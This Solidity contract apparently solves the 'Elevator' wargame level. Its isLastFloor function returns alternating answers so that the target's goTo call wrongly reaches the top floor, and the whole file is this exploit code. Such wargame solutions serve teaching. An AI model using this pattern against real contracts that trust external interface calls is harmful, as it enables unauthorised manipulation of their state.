pragma solidity ^0.6.0;

contract ElevatorAttack {
    bool flag = true;
    event Response(uint x);

    function attack(address _contract) public {
        (bool result, ) = _contract.call(abi.encodeWithSignature("goTo(uint256)", 1));
        if (result) { emit Response(1111); }
        else { emit Response(2222); }
    }

    function isLastFloor(uint) external returns (bool) {
        flag = !flag;
        return flag;
    }
}